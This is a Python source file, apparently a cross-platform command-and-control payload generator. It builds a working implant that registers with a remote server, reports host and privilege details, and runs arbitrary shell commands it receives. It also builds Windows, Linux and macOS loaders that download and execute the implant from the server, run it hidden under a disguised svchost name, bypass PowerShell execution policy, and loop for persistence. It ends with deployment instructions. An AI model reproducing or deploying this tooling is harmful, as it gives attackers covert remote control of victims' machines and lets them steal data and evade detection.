#!/usr/bin/env python3
import os
import sys
import base64
import random
import string
import platform
import subprocess

class PayloadGenerator:
    def __init__(self, server_url, output_dir="./payloads"):
        self.server_url = server_url
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)
    
    def generate_python_implant(self, output_name="implant.py"):
        """Generate Python implant (works on Windows/Linux/macOS)"""
        
        implant_code = self.create_universal_implant()
        
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(implant_code)
        
        if platform.system() != "Windows":
            os.chmod(output_path, 0o755)
        
        print(f"[+] Python implant created: {output_path}")
        return output_path
    
    def create_universal_implant(self):
        """Create implant that works on all OSes"""
        
        implant_code = '''#!/usr/bin/env python3
"""
Cross-Platform C2 Implant - Working Version
Works on Windows, Linux, and macOS
"""

import subprocess
import requests
import json
import time
import socket
import platform
import os
import sys
import base64
import random
from datetime import datetime

try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass

class C2Implant:
    def __init__(self, server_url):
        self.server_url = server_url
        self.agent_id = None
        self.running = True
        self.beacon_interval = 5
        self.jitter = 20
        self.working_dir = os.getcwd()
        self.os_type = platform.system()
        
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    def get_system_info(self):
        try:
            if self.os_type == "Windows":
                username = os.environ.get('USERNAME', 'unknown')
            else:
                username = os.environ.get('USER', os.environ.get('LOGNAME', 'unknown'))
        except:
            username = 'unknown'
        
        try:
            if self.os_type == "Windows":
                import ctypes
                privilege = "admin" if ctypes.windll.shell32.IsUserAnAdmin() != 0 else "user"
            else:
                privilege = "root" if os.geteuid() == 0 else "user"
        except:
            privilege = "unknown"
        
        return {
            "hostname": socket.gethostname(),
            "username": username,
            "os_type": self.os_type,
            "os_version": platform.version(),
            "os_release": platform.release(),
            "architecture": platform.machine(),
            "ip_address": self.get_local_ip(),
            "working_dir": self.working_dir,
            "privilege_level": privilege
        }
    
    def execute_command(self, command):
        try:
            if command.lower().startswith('cd '):
                path = command[3:].strip()
                try:
                    os.chdir(path)
                    self.working_dir = os.getcwd()
                    return "[+] Changed directory to: " + self.working_dir
                except Exception as e:
                    return "[-] Failed to change directory: " + str(e)
            
            if self.os_type == "Windows":
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, cwd=self.working_dir)
            else:
                result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, cwd=self.working_dir, executable='/bin/bash')
            
            output = result.stdout if result.stdout else result.stderr
            if not output:
                output = "[+] Command executed successfully (no output)"
            
            return output
            
        except subprocess.TimeoutExpired:
            return "[-] Command timed out after 30 seconds"
        except Exception as e:
            return "[-] Error: " + str(e)
    
    def register(self):
        try:
            info = self.get_system_info()
            
            response = requests.post(
                self.server_url + "/api/register",
                json=info,
                verify=False,
                timeout=10
            )
            
            if response.status_code == 200:
                data = response.json()
                self.agent_id = data.get('agent_id')
                self.beacon_interval = data.get('sleep_time', 5)
                print("[+] Registered with ID: " + self.agent_id)
                return True
            else:
                print("[-] Registration failed")
                return False
                
        except Exception as e:
            print("[-] Registration error: " + str(e))
            return False
    
    def beacon(self):
        print("[*] Starting beaconing to " + self.server_url)
        
        while self.running:
            try:
                heartbeat = {
                    'agent_id': self.agent_id,
                    'timestamp': datetime.now().isoformat(),
                    'working_dir': self.working_dir
                }
                
                response = requests.post(
                    self.server_url + "/api/beacon",
                    json=heartbeat,
                    verify=False,
                    timeout=30
                )
                
                if response.status_code == 200:
                    tasks = response.json().get('tasks', [])
                    
                    for task in tasks:
                        print("[*] Received task: " + task.get('command', ''))
                        output = self.execute_command(task.get('command', ''))
                        
                        result = {
                            'agent_id': self.agent_id,
                            'task_id': task.get('id'),
                            'output': output,
                            'status': 'completed'
                        }
                        
                        requests.post(
                            self.server_url + "/api/task_result",
                            json=result,
                            verify=False,
                            timeout=30
                        )
                        
                        print("[+] Task completed")
                
                sleep_time = self.beacon_interval + random.randint(-self.jitter, self.jitter)
                sleep_time = max(1, sleep_time)
                time.sleep(sleep_time)
                
            except Exception as e:
                print("[-] Beacon error: " + str(e))
                time.sleep(30)
    
    def run(self):
        print("[*] C2 Implant starting on " + self.os_type)
        print("[*] Server URL: " + self.server_url)
        
        if self.register():
            self.beacon()
        else:
            print("[-] Failed to register. Retrying in 60 seconds...")
            time.sleep(60)
            self.run()

if __name__ == '__main__':
    import ssl
    try:
        ssl._create_default_https_context = ssl._create_unverified_context
    except:
        pass
    
    SERVER_URL = "''' + self.server_url + '''"
    implant = C2Implant(SERVER_URL)
    implant.run()
'''
        
        return implant_code
    
    def generate_powershell_loader(self, output_name="loader.ps1"):
        """Generate PowerShell loader"""
        
        # Get base64 of implant
        implant_path = os.path.join(self.output_dir, "implant.py")
        if not os.path.exists(implant_path):
            self.generate_python_implant()
        
        with open(implant_path, "r") as f:
            implant_code = f.read()
        
        implant_b64 = base64.b64encode(implant_code.encode()).decode()
        
        ps_script = '''# PowerShell Loader for C2 Implant
$implantCode = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("''' + implant_b64 + '''"))
$tempFile = "$env:TEMP\\svchost.py"
$implantCode | Out-File -FilePath $tempFile -Encoding UTF8
Start-Process -FilePath "python" -ArgumentList "$tempFile" -WindowStyle Hidden
Start-Sleep -Seconds 30
Remove-Item $tempFile -Force -ErrorAction SilentlyContinue
'''
        
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(ps_script)
        
        print(f"[+] PowerShell loader created: {output_path}")
        return output_path
    
    def generate_batch_loader(self, output_name="loader.bat"):
        """Generate batch loader"""
        
        batch_script = '''@echo off
powershell -ExecutionPolicy Bypass -Command "& { $wc=New-Object System.Net.WebClient; $wc.DownloadString(''' + self.server_url + '''/payloads/implant.py') | python - }"
'''
        
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(batch_script)
        
        print(f"[+] Batch loader created: {output_path}")
        return output_path
    
    def generate_vbs_loader(self, output_name="loader.vbs"):
        """Generate VBS loader"""
        
        vbs_script = '''Set objShell = CreateObject("Wscript.Shell")
objShell.Run "powershell.exe -ExecutionPolicy Bypass -Command ""IEX (New-Object Net.WebClient).DownloadString(''' + self.server_url + '''/payloads/loader.ps1')""", 0, False
'''
        
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(vbs_script)
        
        print(f"[+] VBS loader created: {output_path}")
        return output_path
    
    def generate_linux_loader(self, output_name="implant.sh"):
        """Generate Linux shell script loader"""
        
        linux_script = '''#!/bin/bash
# Linux C2 Implant Loader
while true; do
    python3 -c "$(curl -k -s ''' + self.server_url + '''/payloads/implant.py)" 2>/dev/null
    sleep 60
done
'''
        
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(linux_script)
        
        os.chmod(output_path, 0o755)
        print(f"[+] Linux loader created: {output_path}")
        return output_path
    
    def generate_macos_loader(self, output_name="implant.command"):
        """Generate macOS loader"""
        
        mac_script = '''#!/bin/bash
# macOS C2 Implant Loader
python3 -c "$(curl -k -s ''' + self.server_url + '''/payloads/implant.py)" &
'''
        
        output_path = os.path.join(self.output_dir, output_name)
        with open(output_path, "w") as f:
            f.write(mac_script)
        
        os.chmod(output_path, 0o755)
        print(f"[+] macOS loader created: {output_path}")
        return output_path
    
    def generate_all_payloads(self):
        """Generate all payloads"""
        print("\n" + "="*60)
        print("Cross-Platform C2 Payload Generator")
        print("="*60)
        print(f"[*] C2 Server URL: {self.server_url}")
        print(f"[*] Output directory: {self.output_dir}")
        print("="*60 + "\n")
        
        # Generate payloads
        print("[*] Generating Python implant...")
        self.generate_python_implant()
        
        print("\n[*] Windows Payloads:")
        self.generate_powershell_loader()
        self.generate_batch_loader()
        self.generate_vbs_loader()
        
        print("\n[*] Linux Payloads:")
        self.generate_linux_loader()
        
        print("\n[*] macOS Payloads:")
        self.generate_macos_loader()
        
        print("\n" + "="*60)
        print("[+] All payloads generated successfully!")
        print(f"[+] Location: {self.output_dir}")
        print("="*60)
        
        # List all files
        print("\n[*] Generated files:")
        for file in os.listdir(self.output_dir):
            file_path = os.path.join(self.output_dir, file)
            size = os.path.getsize(file_path)
            print(f"    - {file} ({size} bytes)")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 payload_generator_working.py <C2_SERVER_URL>")
        print("Example: python3 payload_generator_working.py https://172.24.1.83:443")
        print("Example: python3 payload_generator_working.py http://172.24.1.83:5000")
        sys.exit(1)
    
    server_url = sys.argv[1]
    generator = PayloadGenerator(server_url)
    generator.generate_all_payloads()
    
    print("\n[*] Deployment Instructions:")
    print("-"*40)
    print("Windows:")
    print("  - Python: python implant.py")
    print("  - PowerShell: powershell -ExecutionPolicy Bypass -File loader.ps1")
    print("  - Batch: loader.bat")
    print("  - VBS: cscript loader.vbs")
    print("\nLinux:")
    print("  - Python: python3 implant.py")
    print("  - Shell: ./implant.sh")
    print("\nmacOS:")
    print("  - Python: python3 implant.py")
    print("  - Command: ./implant.command")
    print("="*60)
